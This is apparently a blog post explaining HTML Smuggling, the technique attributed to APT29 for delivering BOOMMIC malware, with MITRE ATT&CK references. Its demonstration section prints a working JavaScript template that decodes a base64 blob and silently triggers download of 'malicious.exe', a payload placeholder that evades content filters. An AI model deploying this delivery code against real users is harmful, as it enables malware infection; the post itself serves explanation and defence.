![](https://miro.medium.com/max/828/0*Aw6bV3Z25-ZvigSU.webp)

A few years ago, NOBELIUM APT, or APT29, were using a technique known as HTML Smuggling, which allowed them to deliver malicious software, such as banking trojans, through the legitimate resources of HTML5 and Javascript. With this technique, attackers could refine their malicious page and consequently bypass a firewall within a network.

The technique was used to deploy BOOMMIC malware onto target machines via a phishing campaign, known as spear phishing. The malware’s purpose was government agencies and maintaining access to the target’s machines.

## How Does the Technique Work?

Adversaries can smuggle data and files through content filters, hiding malicious payloads within seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data representing raw bytes) that can later be built into file-like objects. Data can also be stored in data URLs, which allow embedding media types or MIME files inline from HTML documents. HTML5 also introduced a download attribute that can be used to initiate file downloads.

Adversaries can deliver payloads to victims who bypass security controls by smuggling HTML, abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify malicious files smuggled within HTML/JS files, as the content may be based on typically benign MIME types such as text/plaine/or text/html. Malicious files or data can be obfuscated and hidden within HTML files via data URLs and/or JavaScript Blobs and can be unobstructed when they reach the victim (i.e. Deobfuscate/Decode files or information), potentially bypassing content filters.

This is a graphic example of an HTML Smuggling based attack by [CyberHoot](https://cyberhoot.com/):

![](https://miro.medium.com/max/828/0*fUcYhkmQDfxaazXR.webp)

## Demonstration

This is an example of the exploit script:

```
<html>
   <body>
      <script>
         function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i); 
            } 
            return bytes.buffer;
         } 
         var file = "BASE64 FILE HERE";
         var data = base64ToArrayBuffer(file);
         var blob = new Blob([data], {type: "octet/stream"});
         var fileName = "malicious.exe";
         var a = document.createElement("a");
         document.body.appendChild(a);
         a.style = "display: none";
         var url = window.URL.createObjectURL(blob);
         a.href = url;
         a.download = fileName;
         a.click();
         window.URL.revokeObjectURL(url);
      </script>
   </body>
</html>
```

Execution:

![](https://miro.medium.com/max/640/1*gpziN4bCL-WNKCJNP52obA.webp)

![](https://miro.medium.com/max/828/1*Rcuw8t4u_63wYz2ECBetMg.webp)

## References
* https://securityaffairs.co/wordpress/124522/hacking/html-smuggling-technique.html
* https://attack.mitre.org/techniques/T1027/006/
* https://socprime.com/blog/novel-beatdrop-and-boommic-malware-families-used-by-apt29-phishing-campaigns-with-html-smuggling-techniques-long-term-access-for-espionage-purposes/
* https://cyware.com/news/microsoft-observes-an-uptick-in-html-smuggling-attacks-0dd0ead1
* https://cyberhoot.com/cybrary/html-smuggling/
